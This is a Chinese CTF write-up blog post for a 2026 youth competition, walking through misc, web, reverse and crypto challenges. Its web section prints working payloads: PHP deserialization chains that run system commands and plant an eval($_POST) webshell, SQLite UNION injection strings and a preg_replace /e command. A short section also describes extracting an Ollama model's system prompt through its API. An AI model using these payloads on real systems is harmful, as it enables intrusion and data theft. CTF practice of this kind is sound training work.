---
title: 青少年CTF S1 · 2026 公益赛
date: 2026-03-25
tags:
  - ctf
---
{{< toc >}}
## misc
### 哦
```plain
描述：文件看起来好眼熟

图片怎么一模一样
```

![](青少年ctf季赛.md_Attachments/1768293316775-8bc5cf5f-4956-4304-811b-b88f317bebca.png)

一眼反转PK压缩包，cyberchef转一下

转完后导出还是打不开，仔细观察一下发现反转后`504b0304（头文件标记）`在文件尾部

应该还是反转，但是会是什么规则呢？

![](青少年ctf季赛.md_Attachments/1768293538634-06d2e059-e5ca-49d1-bda0-4f9e7d9fc1b7.png)

再次观察文件头，假设这个是PK文件，那么`504b0304`一定在最开始

因此尝试每8字节反转

```plain
from pathlib import Path

inp = Path("哦").read_bytes()
n = 8

out = bytearray()
for i in range(0, len(inp), n):
    out += inp[i:i+n][::-1]   # 不足 8 字节也照样反转

Path("out.zip").write_bytes(out)
print("written out.zip")
```

这个就对了，能得到正确的压缩包

然后里面是张png图片，而且压缩包有加密，不是伪加密

尝试字典爆破以及简单爆破无果

通过png文件头进行明文爆破

有点忘记bkcrack怎么用了，照着ai流程做吧

先提取密文流 `cipher.bin`

```plain
import zipfile, struct, pathlib

zip_path = "out.zip"
name = "a.png"

zf = zipfile.ZipFile(zip_path)
zi = zf.getinfo(name)

with open(zip_path, "rb") as f:
    f.seek(zi.header_offset)
    local = f.read(30)
    sig,ver,flag,comp,mtime,mdate,crc,csz,usz,fnlen,exlen = struct.unpack("<IHHHHHIIIHH", local)
    assert sig == 0x04034B50
    f.seek(zi.header_offset + 30 + fnlen + exlen)
    data = f.read(zi.compress_size)  # 通常这里已包含 12-byte encryption header
pathlib.Path("cipher.bin").write_bytes(data)

print("file_size:", zi.file_size, "compress_type:", zi.compress_type, "compress_size:", zi.compress_size)
```

准备已知明文`plain.bin`

```plain
import pathlib
plain = bytes.fromhex("89504E470D0A1A0A0000000D49484452")
pathlib.Path("plain.bin").write_bytes(plain)
```

运行bkcrack得到keys

```plain
bkcrack -c cipher.bin -p plain.bin
```

![](青少年ctf季赛.md_Attachments/1768301171740-0a078755-6153-4889-9451-e84cd1780e13.png)

然后根据keys生成无加密zip

```plain
bkcrack -C out.zip -k <k0> <k1> <k2> -D decrypted.zip
```

![](青少年ctf季赛.md_Attachments/1768301369784-c77c160c-f769-4686-a8c8-dadd0b6803ce.png)



解压拿到a.png

随波逐流一把梭，能提取出两张图片，几乎一模一样，但从文件大小看出并不是同一张图片

通过双图盲水印解出flag

![](青少年ctf季赛.md_Attachments/1768301313765-044863a5-d336-4333-a5d0-db874d99494f.png)

![](青少年ctf季赛.md_Attachments/1768301298035-b6b64584-099a-4042-992b-1cdac1050d77.png)

```plain
flag{01d38cf8-e6f9-11f0-8fcd-11155d4a}
```

### 玫坏的压缩包
压缩包解压不了

![](青少年ctf季赛.md_Attachments/1768290208758-98273523-1923-4ffa-86df-daec7cf13de4.png)

010查看能发现本身是docx文件，但损坏了

因为docx文件本身就能被解压为xml

![](青少年ctf季赛.md_Attachments/1768290140580-2154e3ad-af83-441e-9e24-8b42fca60bd0.png)

把PK之前的内容删去后再解压

![](青少年ctf季赛.md_Attachments/1768290338678-3acc3027-c996-4b29-b070-7c85c585ec4d.png)

去word文件夹里找document.xml查看docx内容，找到flag

![](青少年ctf季赛.md_Attachments/1768290384122-fdae8341-b1c7-4ace-af49-824f9e6f9426.png)

![](青少年ctf季赛.md_Attachments/1768290356150-d5f00444-7e63-4d90-9abf-367007650e68.png)

### Ollama Prompt Injection
ai题，没给前端界面，只给了api

用cherrystudio连一下api

里面能找到两个模型，应该是这个ctf-model:latest

![](青少年ctf季赛.md_Attachments/1768290537034-4b241219-cff7-4400-b8d8-9cb95d158c85.png)

![](青少年ctf季赛.md_Attachments/1768290582911-bd675b56-3146-4841-984c-258419461613.png)

添加后就可以对话了

![](青少年ctf季赛.md_Attachments/1768290757604-f422caac-1bff-487e-bc08-de7ca3bdadf1.png)

唐氏ai



当然其实有了api，可以直接post访问`/api/show`，查看完整 JSON 格式详情，包含所有配置、参数、模板、系统提示词等全部内容  

```plain
enctype需要改为json格式
{"name":"ctf-model:latest"}
```

![](青少年ctf季赛.md_Attachments/1768291026909-1039e687-5936-4d99-89c7-d431361440a5.png)

### 好，把他们上市！

```
题目来自于投稿  
你是哑巴瑞克，醒来发现身处牢房之中，面前有一把锁，还有一张纸条…………  
你知道，上市之道就在其中…………
```

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324211015707.png)

明显是明文爆破

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324211047434.png)

直接爆破就行了

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324211224614.png)

得到二维码得到密码，打开flag.txt
得到一层flag
```
flag{VmpKb2FHUkdPVmhSVms1bVYxUkNNV05zT1U1VFZrNVVUVVUxWm1GWE5XWlZNbWhvWW0xa1NWRlZhejA9!!!}
```
![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324211540882.png)
```
flag{What_WAS_Y0ur_MISS0N_in_ShangHAI!!!}
```
### 找到呆唯
```
题目来自于投稿  
呆唯走丢了，找到她，她会告诉你flag的
```
给了txt文件，里面是base64编码，解码后得到图片
![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324212057128.png)


另一个是zip文件，写了喜欢用符号和数字

![530](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324212220258.png)

爆破得到密码

![697](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324212456346.png)

里面txt是字密，通过阴阳怪气解密得到网站网址

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324213103497.png)
得到网址，将之前得到的图片放进去，然后进行解码

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260324213317849.png)

```
flag{iam_here!!!}
```
### 消失的Yui
```
题目来源于投稿  
你是A市的警官，负责找到离奇失踪的作家Yui，你找到了一些线索，觉得事情大有蹊跷……
```
这题史完了，纯逆天
附件给了txt和zip，zip有加密且不是伪加密
![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325104802329.png)

这一看就是零宽度隐写

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325104842388.png)

解出来得到flag格式，然而这是最后一步，对接下来的解题没啥用
然后试了半天，感觉突破口还是在这个txt里，看到里面有表情emoji
把它们提取出来解码试试

> [!NOTE] Tips
> 注意不要有空格，我之前用ai提取出来的emoji有空格因此解码失败

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325105617719.png)

得到压缩包密码，解压得到图片和txt文本
图片是二维码，识别得到base64字符串

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325105940464.png)

直接base64解不出来，应该还有其他加密
这里最史的一点就是这个加密算法需要通过单图盲水印看出来
byd这个单图盲水印极其模糊，根本看不清

![](青少年ctf季赛.md_Attachments/under_the_sea_fft.png)

只能隐约看出RC4这几个字符
算了，总之继续找密钥吧，应该在txt里

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325110142107.png)

依旧零宽度字符隐写

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325110208220.png)

哈？啥意思，再看看txt
问ai得到key，我说实话这个key也是纯史
- 第一部分明给 `十一时四十五分` → `1145`
- 第二部分明给 `1419`
- 第三部分明给 `1981`
- 第四部分“归零” → 末尾补 `0`

拼起来就是：

1145 + 1419 + 1981 + 0 = 1145141919810

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325110328222.png)

然后解码得到做坐标

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325110357964.png)

最后得到城市合肥
```
flag{hefei}
```
## web
### easy_php
```plain
在这个简单的网页后端中，似乎没有任何危险的函数直接暴露。你能让它“发出声音”，拿到根目录下的 /flag 吗？
```

题目给出php代码

```plain
<?php
// 屏蔽报错，增加一点黑盒难度
error_reporting(0);
// TIPS：FLAG在根目录下

class Monitor {
    private $status;
    private $reporter;

    public function __construct() {
        $this->status = "normal";
        $this->reporter = new Logger();
    }

    public function __destruct() {
        // 当对象销毁时，如果状态是 danger，则触发报警
        if ($this->status === "danger") {
            $this->reporter->alert();
        }
    }
}

class Logger {
    public function alert() {
        echo "System normal. No alert needed.\n";
    }
}

class Screen {
    public $content;
    public $format;

    public function alert() {
        // 这里的调用看起来像是一个格式化输出
        $func = $this->format;
        return $func($this->content);
    }
}

// 入口点
if (isset($_GET['code'])) {
    $input = $_GET['code'];
    
    // 简单的过滤，不允许直接输入 flag 关键字，但这不影响反序列化过程
    if (preg_match('/flag/i', $input)) {
        die("No flag here!");
    }

    unserialize($input);
} else {
    highlight_file(__FILE__);
}
?>
```

反序列化，依旧简单pop链

行吧，是flag.txt

欺骗我感情

注意一下，如果是private的话是直接显示 Monitor+相应的变量名称的，但是没什么区别，直接写就行了 

 所以payload长这个样子 

```php
<?php

class Screen
{
    public $content;
    public $format;
}
class Monitor
{
    private $status = "danger";
    private $reporter;
    public function __construct()
    {
        $s = new Screen();
        $s->content = "cat /f*";
        $s->format = "system";
        $this->reporter = $s;
    }

}
$m = new Monitor();
echo urlencode(serialize($m));
?>
```

### Serialization
```plain
<?php
error_reporting(0);
highlight_file(__FILE__);
class AuditLog {
    public $handler;

    public function __construct() {
        $this->handler = new SystemStatus();
    }

    public function __toString() {
        return $this->handler->process();
    }
}

class FileCache { 
    public $filePath; 
    public $content; 
    public function __construct($path = '', $data = '') {
        $this->filePath = $path;
        $this->content = $data;
    }

    public function process() {
        $security_header = '<?php exit("Access Denied: Protected Cache"); ?>';
        
        $final_data = $security_header . $this->content;
        file_put_contents($this->filePath, $final_data);
        
        return "Cache Saved.";
    }
}

class SystemStatus {
    public function process() {
        if(file_exists('./system_config.php')) {
            include('./system_config.php');
        }
        return "System logic normal.";
    }
}


$payload = $_POST['data']; 

if(isset($payload)){
    echo unserialize($payload);
}
else{
    echo "Invalid data stream.";
}
?>
```

反序列化，构造pop链

exit退出用伪协议rot13绕过

payload代码如下

```plain
<?php
error_reporting(0);
highlight_file(__FILE__);
class AuditLog {
    public $handler;

    public function __construct() {
        $this->handler = new FileCache('php://filter/string.strip_tags|convert.base64-decode/resource=shell.php','PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=');
    }

    public function __toString() {
        return $this->handler->process();
    }
}

class FileCache {
    public $filePath;
    public $content;
    public function __construct($path = '', $data = '') {
        $this->filePath = $path;
        $this->content = $data;
    }

    public function process() {
        $security_header = '<?php exit("Access Denied: Protected Cache"); ?>';

        $final_data = $security_header . $this->content;
        file_put_contents($this->filePath, $final_data);

        return "Cache Saved.";
    }
}

$pl=new AuditLog();
echo urlencode(serialize($pl));
```

rot13参数如下

```plain
$path='php://filter/string.rot13/resource=shell.php'
$data='<?cuc riny($_CBFG["a"]);?>'
```

注入后发现有问题

![](青少年ctf季赛.md_Attachments/1768216562473-870e97d6-0305-4127-a4b9-484f696da227.png)

因为rot13不会改变符号，然后可能是php将<?也识别为php代码的开始，然后遇到报错停止执行了



那就换一种，用base64+去除php标签，参数如下

```plain
$path='php://filter/string.strip_tags|convert.base64-decode/resource=shell.php'
$data='PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4='
//<?php eval($_POST['a']);?>
```

这样就能得到纯净的木马

蚁剑连接拿到flag

![](青少年ctf季赛.md_Attachments/1768216486596-a2c1c0b7-2203-4b25-94d6-ed14a406f2c9.png)

### silent_logger
使用database显示无函数，猜测是sqlite而不是mysql

![](青少年ctf季赛.md_Attachments/1768213936004-80036597-dcab-4e03-89c8-8e040468cd81.png)

测试后果然如此

查看表结构

```plain
-1'union select 1,2,sql from sqlite_master --+
```

![](青少年ctf季赛.md_Attachments/1768214244445-60223bf9-25be-47dc-bea8-9476f1804f8a.png)

然后查数据

```plain
-1'union select 1,id,value from flags --+
```

![](青少年ctf季赛.md_Attachments/1768214378654-b7612b9c-1a68-4ad5-a3fc-24bca284089e.png)

拿到flag

### 时间胶囊留言板
```plain
你被分配到了一个神秘的 Web 系统测试任务——一个“时间胶囊留言板”。用户可以在这个留言板上留下自己的留言，但留言只有在未来的指定日期才能被解封查看。系统还隐藏了一条特殊信息（FLAG），只有当时间到达后才能显示
```

![](青少年ctf季赛.md_Attachments/1768217278029-6866bc69-cc5f-45d7-a04a-6fecb20f4701.png)

这题留言功能没啥用，主要是把这个为解封的内容显示出来

能在源代码里看到js代码

```plain
<script>
        // 计算距离解封还有多少天
        function calculateCountdown(unlockDate) {
            const now = new Date();
            const unlock = new Date(unlockDate);
            const diffTime = unlock - now;
            const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
            return diffDays;
        }
        
        // 更新所有留言的倒计时和内容显示
        function updateMessages() {
            const messageItems = document.querySelectorAll('.message-item');
            const now = new Date();
            
            messageItems.forEach(item => {
                const unlockDate = item.dataset.unlockDate;
                const unlockDateObj = new Date(unlockDate);
                const contentId = item.querySelector('.message-content').id;
                const countdownId = item.querySelector('.countdown').id;
                const messageId = contentId.split('-')[1];
                
                if (now >= unlockDateObj) {
                    // 已经解封，显示真实内容
                    fetch('get_content.php?id=' + messageId)   .then(response => response.text())
                        .then(data => {
                            document.getElementById(contentId).textContent = data;
                            document.getElementById(contentId).classList.remove('hidden');
                            document.getElementById(countdownId).textContent = '';
                        });
                } else {
                    // 未解封，显示倒计时
                    const daysLeft = calculateCountdown(unlockDate);
                    document.getElementById(countdownId).textContent = `距离解封还有 ${daysLeft} 天`;
                }
            });
        }
        
        // 初始加载时更新一次
        updateMessages();
        
        // 每分钟更新一次倒计时
        setInterval(updateMessages, 60000);
    </script>
```

这里当时我想当然想着动调然后修改`unlockDate="2026-01-11"`

但这样修改是只修改了显示，因为判断用的不是这个unlockDate

![](青少年ctf季赛.md_Attachments/1768217483388-39ab6759-178a-4415-9f9e-002ccff829db.png)

仔细审计代码后发现需要修改的element里的内容

修改element里的`<div class="message-item" data-unlock-date="2026-01-22">`

![](青少年ctf季赛.md_Attachments/1768217536962-0fbf5019-b0d5-473f-be72-8fe3445ed6af.png)

然后在控制台输入刷新代码，显示flag

```plain
updateMessages()
```

![](青少年ctf季赛.md_Attachments/1768217580333-44a75b85-49dc-4e09-b473-fd433fab5710.png)

###  preg_replace 
简简单单preg_replace

```plain
<?php
highlight_file(__FILE__);
$input = $_GET['data'];
echo preg_replace("/(.*)/e", "\\1", $input);
?>
```

分析一下正则，括号是分组，/在php里相当于^$，

+ `/e` 是 **“evaluate” 修饰符**（旧版本 PHP 支持，PHP 5.5 起弃用，PHP 7 移除）。
+ 含义不是“把匹配内容替换成字符串”，而是：**把 replacement 当作 PHP 代码执行（eval）**，执行结果作为替换结果

\\1相当于\1，表示第一个分组

所以这段代码相当于 把用户传入的 `data` 作为代码执行，并把执行结果输出  

这里直接用`system('ls');`会报错

![](青少年ctf季赛.md_Attachments/1768219757335-967091fb-974f-4ea5-94ec-ca28019b2fa4.png)

**服务端对 **`**$_GET**`** 做了自动转义**  
典型是老 PHP 环境里的 `magic_quotes_gpc`（历史遗留选项），或代码/框架里对输入做了 `addslashes()` 一类处理  

不过可以用 ` 进行命令替换

```plain
`cat /flag`
```

![](青少年ctf季赛.md_Attachments/1768219530829-986b2544-161b-4030-8034-74f15afbb0f4.png)

###  答案之书 
```plain
传闻世间有一本《答案之书》，能解众生心中困惑。你只需虔诚地递上你的疑问，它便会给予你命运的指引。
然而，书页之间似乎隐藏着某种古老的禁制，唯有避开那些“禁忌之语”，方能窥见真实的奥秘。
万物皆有裂痕，那是光照进来的地方。你能否在禁忌的边缘，寻得那最终的真相（Flag）？
```

![](青少年ctf季赛.md_Attachments/1768221269907-990cce93-6681-4c77-a036-1aba61f41f80.png)

看到wrapper，想到渲染，试一下{{7*7}}，可以打进去，参数是question（get）

![](青少年ctf季赛.md_Attachments/1768221144814-8f06f10c-4424-4e70-a057-ca3344019d61.png)

fenjing一把梭

![](青少年ctf季赛.md_Attachments/1768221057335-4e351f45-ded0-49ed-aa0f-3d57356d10cb.png)

### Callback
```plain
我们有一个简单的 PHP 脚本，负责处理用户输入，并通过回调函数对数组进行操作，然而，这个脚本并未对输入进行严格的过滤。你是否能发现某些细节并利用它来深入了解更多信息？
```

```plain
<?php

function executeCallback($callback)
{
    $someArray = [0, 1, 2, 3];
    return array_map($callback, $someArray);
}

if (isset($_GET['callback'])){
    $evilCallback = $_GET['callback'];
    $newArray = executeCallback($evilCallback);
}

?>
```

这题我直接试出来了，原来以为需要调用 ReflectionClass  静态类做

然后想着先试试其他的内置函数

然后phpinfo就直接试出来了

![](青少年ctf季赛.md_Attachments/1768224785826-96513b2f-55f3-485a-88a4-5e92c0e87989.png)

## reverse

> [!NOTE] Title
> reverse也有不少是ai解的，其实不算难，但ai解的有点快了（）
### AES？

```
简单的AES你一定一看就会吧？
```

```
input = textBox1.Text
keyStr = "q1s1c1t1f1"
target = "v6XOdOAcNjXvbD8NSHvRdr98ZSVzUvCY9Kdi8DU4DMZ+IFteVt2XpayB3jSDfOsf"

key = UTF8(keyStr) 后拷贝到 16 字节数组，不足补 0
iv  = 16 字节全 0
mode = CBC
padding = PKCS7

result = Base64(AES_Encrypt(input))
if result == target: 成功
```

直接解密即可，参数全给了
```
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import base64

key = b"q1s1c1t1f1" + b"\x00" * 6
iv = b"\x00" * 16
ct = base64.b64decode("v6XOdOAcNjXvbD8NSHvRdr98ZSVzUvCY9Kdi8DU4DMZ+IFteVt2XpayB3jSDfOsf")

cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
pt_padded = cipher.decryptor().update(ct) + cipher.decryptor().finalize()
unpadder = padding.PKCS7(128).unpadder()
pt = unpadder.update(pt_padded) + unpadder.finalize()

print(pt.decode())
```

```
flag{4f7786120450144791741bd082bfdb58}
```
### CheckMe
```
看看我，看看我
```

披着 GUI 外套的小 RSA：

1. 读取输入框内容
2. `UTF8.GetBytes`
3. 把字节数组 `Reverse`
4. 末尾补一个 `0x00`
5. 用这个字节数组构造 `BigInteger`
6. 做 `BigInteger.ModPow(m, 3, N)`
7. 和程序里写死的密文 `C` 比较

程序里参数是：

- `e = 3`
- `N = 139906397693819072650020069738596428398031056847078650722938421657851057538054976098647199375778966594569804403764522779998221022521589609634646037802060716905855507095146407052611429717736127575527226826221045673236950913759662383017581323909723145061976871530014985740162801140394142912236064962190443170959`
- `C = 2217344750798660611960824139035634065708739786485564450254905817930548259011086486194666552393884157042723116691899397246215979757440793411656175068361811329038472101976870023549368315569713807716791321322016687562917756728015984717774303119415642719966332933093697227475301`

因为这里 `C < N`，而且明文很短，所以本质上不是“模意义下绕圈”，而是直接：

```
m^3 = C
```

对 `C` 开整数立方根就直接拿到 `m`。  
再把 `m` 按大端字节还原成字符串，就是这个 flag
```
flag{8a5e3e5eac499995bd10c17f8bc9c954}
```
### except_expert

主逻辑要求输入 **48 字节**，然后把输入和一个全局 48 字节缓冲区异或，再跑一轮 24 字节分组的自定义块算法

自定义算法分析一下能看出是魔改TEA

直接把密文逆回去
```
qsnctf{Th3_w1Nd0wS_cPP_Exc3P710N_1S_s0oO_FuN!!!}
```
### oi_feelings

- 程序先解密提示字符串，内容是
    - `Go and get the max value!!!`
    - `The input only contains "1" and "2", and wrapped with "qsnctf{}".`
- 输入总长度必须是 **70**
- 前缀必须是 **`qsnctf{`**
- 末尾必须是 **`}`**
- 中间 62 位只能由 **`1`** 和 **`2`** 组成
- 其中必须恰好有 **31 个 `1`** 和 **31 个 `2`**

真正的坑在这句:

- 它内置了一个 **32×32 的权重矩阵**
- 从 `(0,0)` 出发
- 遇到 `1` 就向右，遇到 `2` 就向下
- 把沿途格子的值全部累加
- 最终总和必须等于 **47077**
- 这其实就是在找一条 **最大路径和**

我把矩阵解密后跑了 DP，最优路径唯一，正好对应上面的 62 位串

dp求解脚本如下
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import struct
import sys


def read_u16(b, off):
    return struct.unpack_from("<H", b, off)[0]


def read_u32(b, off):
    return struct.unpack_from("<I", b, off)[0]


def find_section(pe_bytes, name: bytes):
    # DOS header
    e_lfanew = read_u32(pe_bytes, 0x3C)

    # PE signature
    if pe_bytes[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        raise ValueError("not a PE file")

    coff_off = e_lfanew + 4
    number_of_sections = read_u16(pe_bytes, coff_off + 2)
    size_of_optional_header = read_u16(pe_bytes, coff_off + 16)

    section_table_off = coff_off + 20 + size_of_optional_header

    for i in range(number_of_sections):
        off = section_table_off + i * 40
        sec_name = pe_bytes[off:off + 8].rstrip(b"\x00")
        virtual_size = read_u32(pe_bytes, off + 8)
        virtual_address = read_u32(pe_bytes, off + 12)
        size_of_raw_data = read_u32(pe_bytes, off + 16)
        pointer_to_raw_data = read_u32(pe_bytes, off + 20)

        if sec_name == name:
            return {
                "name": sec_name,
                "virtual_size": virtual_size,
                "virtual_address": virtual_address,
                "size_of_raw_data": size_of_raw_data,
                "pointer_to_raw_data": pointer_to_raw_data,
            }

    raise ValueError(f"section {name!r} not found")


def extract_data(exe_path):
    pe = open(exe_path, "rb").read()
    sec = find_section(pe, b".data")

    raw = sec["pointer_to_raw_data"]
    data = pe[raw: raw + sec["size_of_raw_data"]]

    # 程序逻辑：
    # 前 3 个 dword 用 ^ 0x9 解密
    # 后 0x400 个 dword（1024 个）用 ^ 0x123 解密
    words = list(struct.unpack_from("<1027I", data, 0))

    first3 = [x ^ 0x9 for x in words[:3]]
    mat_flat = [x ^ 0x123 for x in words[3:]]

    move_right = chr(first3[0])   # 应该是 '1'
    move_down = chr(first3[1])    # 应该是 '2'
    target = first3[2]

    if len(mat_flat) != 32 * 32:
        raise ValueError(f"matrix size wrong: {len(mat_flat)}")

    mat = [mat_flat[i * 32:(i + 1) * 32] for i in range(32)]
    return move_right, move_down, target, mat


def solve_max_path(mat):
    n = len(mat)
    m = len(mat[0])

    NEG = -10**18
    dp = [[NEG] * m for _ in range(n)]
    pre = [[""] * m for _ in range(n)]

    dp[0][0] = mat[0][0]

    for i in range(n):
        for j in range(m):
            if i == 0 and j == 0:
                continue

            from_up = dp[i - 1][j] if i > 0 else NEG
            from_left = dp[i][j - 1] if j > 0 else NEG

            if from_left > from_up:
                dp[i][j] = from_left + mat[i][j]
                pre[i][j] = "1"   # 从左边来，说明这一步是向右
            else:
                dp[i][j] = from_up + mat[i][j]
                pre[i][j] = "2"   # 从上边来，说明这一步是向下

    # 回溯路径
    i, j = n - 1, m - 1
    path = []
    while i > 0 or j > 0:
        c = pre[i][j]
        path.append(c)
        if c == "1":
            j -= 1
        elif c == "2":
            i -= 1
        else:
            raise RuntimeError("broken predecessor table")

    path.reverse()
    path = "".join(path)
    return dp[n - 1][m - 1], path


def calc_path_sum(mat, path, right_ch="1", down_ch="2"):
    x = y = 0
    s = mat[0][0]
    for ch in path:
        if ch == right_ch:
            y += 1
        elif ch == down_ch:
            x += 1
        else:
            raise ValueError(f"bad char in path: {ch!r}")
        s += mat[x][y]
    return s


def main():
    exe_path = sys.argv[1] if len(sys.argv) > 1 else "oi_feelings.exe"

    move_right, move_down, target, mat = extract_data(exe_path)
    best, path = solve_max_path(mat)

    print(f"[+] move_right = {move_right!r}")
    print(f"[+] move_down  = {move_down!r}")
    print(f"[+] target     = {target}")
    print(f"[+] best       = {best}")
    print(f"[+] len(path)  = {len(path)}")
    print(f"[+] count('1') = {path.count('1')}")
    print(f"[+] count('2') = {path.count('2')}")

    check = calc_path_sum(mat, path, "1", "2")
    print(f"[+] check_sum   = {check}")

    print("[+] path =")
    print(path)

    print("[+] candidate flag =")
    print(f"qsnctf{{{path}}}")

    if best != target:
        print("\n[!] 注意：DP 算出来的最大值 != 程序目标值")
        print("[!] 这说明你前面的逆向还没彻底闭环。")
        print("[!] 常见原因：")
        print("    1) 你漏掉了额外运行时修改")
        print("    2) 你抄错了解密常量 / 矩阵")
        print("    3) 你对校验逻辑的理解有偏差")
        print("[!] 别自我感动，先把这三件事重新核一遍。")


if __name__ == "__main__":
    main()
```

```
qsnctf{21112122121122222221222221122111211111222112211112111222122111}
```
### ez_re

非标准AES
直接按照标准AES无法得到明文ASCII
仔细分析加密函数
其MixColumns被修改了
标准 AES 用的是 `2 3 1 1
这题用的是自定义矩阵：
[7 2 5 1]  
[2 5 1 7]  
[1 7 2 5]  
[5 1 7 2]
替换矩阵后得到flag
```
qsnctf{EzAes_w1tH_O6fuSed_1NstS}
```
### muffin_cake

定位到按钮 `Check` 的处理函数了。它干的事很直白：

- 先检查输入长度是否等于 **0x25 = 37**
- 然后逐字符做变换：

```
((input_char_low_byte ^ 0x66) + 0x88) & 0xff
```

程序里的目标字节是：

```
9f 9d 90 8d 9a 88 a5 97 db b0 d9 c1 b3 9b a8 88  
df 90 c1 ad af 95 dd c1 8a ab 92 df 8d df de bb  
db e1 e1 e1 a3
```

逆运算就是：

```
input = ((byte - 0x88) & 0xff) ^ 0x66
```

解出来正好是：

```
qsnctf{i5N7_MuFf1n_CAk3_dEl1c10U5???}
```

### ezpy
```plain
简单的py逆向
```

py逆向，第一步直接用pyinstxtractor提取pyc文件

```plain
python pyinstxtractor.py ezpy.exe
```

![](青少年ctf季赛.md_Attachments/1768293135610-0d2db4c7-a477-4341-8063-31b95f62a58e.png)

然后找 程序名.pyc 到在线网站反编译

![](青少年ctf季赛.md_Attachments/1768293158408-c3153124-d7cd-4555-927e-1d3367bc4c32.png)

反编译代码如下，是个加密函数

```plain
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: ezpy.py
# Bytecode version: 3.8.0rc1+ (3413)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

def check_flag(flag):
    if not flag.startswith('flag{') or not flag.endswith('}'):
        return False
    core = flag[5:-1]
    key = [19, 55, 66, 102]
    enc = []
    for i, c in enumerate(core):
        enc.append(ord(c) ^ key[i % len(key)])
    target = [118, 91, 53, 1, 117, 86, 48, 19]
    return enc == target

def main():
    user_input = input('Input your flag: ').strip()
    if check_flag(user_input):
        print('Correct! 🎉')
    else:
        print('Wrong flag ❌')
if __name__ == '__main__':
    main()
```

解密代码如下，这题反而不是qsnctf了，投稿题吧

```plain
key=[19,55,66,102]
target=[118,91,53,1,117,86,48,19]
core=''.join(chr(t ^ key[i%4]) for i,t in enumerate(target))
print("flag{" + core + "}")
#flag{elwgfaru}
```

## crypto

> [!NOTE] Title
> 由于队伍里没有专精密码学的，因此除去简单题目之外，多为ai解答

### 0x42f
```plain
仔细观察题目名称，你应该能得到你想要的

如果网站解密不行，尝试换换其他的网站吧？
```

题目一眼密钥

用emoji-aes解密失败，换个网站就行了

ai说这是512emoji，不是base64映射

[https://txtmoji.com/](https://txtmoji.com/)

![](青少年ctf季赛.md_Attachments/1768292177414-59558e2e-d747-410b-b424-8df846af8c04.png)

### NO ASCII
```plain
在邮件、网络传输中保证非 ASCII 字符安全传输的是什么？

flag{=E9=9D=92=E5=B0=91=E5=B9=B4CTF=E6=AC=A2=E8=BF=8E=E4=BD=A0}
```

```plain
flag{青少年CTF欢迎你}
```

### Knapsack

```
你截获了一段使用自制加密算法加密的密文。  
该加密算法将明文转换为二进制后，与一组公开的整数权重进行线性组合，最终得到一个整数形式的密文。  
算法中涉及的部分关键参数已被妥善隐藏，只有用于加密的 公钥 被公开。  
你的任务是：仅根据给定的公钥和密文，恢复原始明文

提示：
Lenstra–Lenstra–Lovász 的最短向量？
**二进制长度可能不是 8 的倍数**，所以要在 hex 前？？？
pubkey 超长了怎么办呢？
```

```
from fpylll import IntegerMatrix, LLL
import ast

pk = ast.literal_eval(open("pk.txt").read())
S = int(open("enc.txt").read().strip())
n = len(pk)

B = IntegerMatrix(n+1, n+1)

for i in range(n):
    B[i, i] = 2
    B[i, n] = 2 * pk[i]

for i in range(n):
    B[n, i] = 1
B[n, n] = 2 * S

LLL.reduction(B)

for r in range(n+1):
    row = [B[r, c] for c in range(n+1)]
    if row[-1] == 0 and all(x in (-1, 1) for x in row[:-1]):
        bits = ''.join('1' if x == -1 else '0' for x in row[:-1])
        bits = bits.zfill(n)
        data = int(bits, 2).to_bytes(n // 8, 'big')
        print(bits)
        print(data)
```

![](青少年ctf季赛.md_Attachments/青少年ctf季赛-20260325180451250.png)

```
flag{345Y_CRYP70}
```
### big e

```
我对我的大E非常自信，我可以把它们给你两次！
```
```
from Crypto.Util.number import bytes_to_long, getPrime

  

flag = b"qsnctf{}"

  

pt = bytes_to_long(flag)

  

p = getPrime(1024)

q = getPrime(1024)

n = p*q

  

e_1 = getPrime(16)

e_2 = getPrime(16)

  
  
  

ct_1 = pow(pt, e_1, n)

ct_2 = pow(pt, e_2, n)

print("ct_1 = ", ct_1)

print("ct_2 = ", ct_2)

  

print("e_1 = ", e_1)

print("e_2 = ", e_2)

  

print("n = ", n)

  

# ct_1 =  5649565335684829166994703709424227526893862676464227714220335589276704152604924324114025311155729514770870986954236504564704555535527067819510001985630888010489410355084498786686405391985307787813163409887408873131599860500818287249474949435981248525429437566989511739623645812030127508754237307712031275069780710099525638162980612740682033778940586593666680892993610688520294640884980062959079158405843270214715267881440440339150600253703915746065480485251932360881192748881417272231086499695809894156350146444967947730629173024309214554705882003920254677073584631736742572109190599880801473561959319027076441953445

# ct_2 =  18057738004521442202581208706347939725140669900210781627129228864852861993001064574996038998190758020094241377866589024516040225406530219251533264723200285643625227689027372929065070061403841600339743979018711778484342112384547861311017571072207706363341501151970830224052331515660939863240931224477883263629549854691715424922845010950429159326308647808310970838674468530257927010981568201656330319135247562919603753523391148946139453657084433473736518140826834607288043167145971704069967785291825113657089124890698730576640845997643271760048177660480776933178966895624625446578014520381072642845438343988815282525599

# e_1 =  38393

# e_2 =  33179

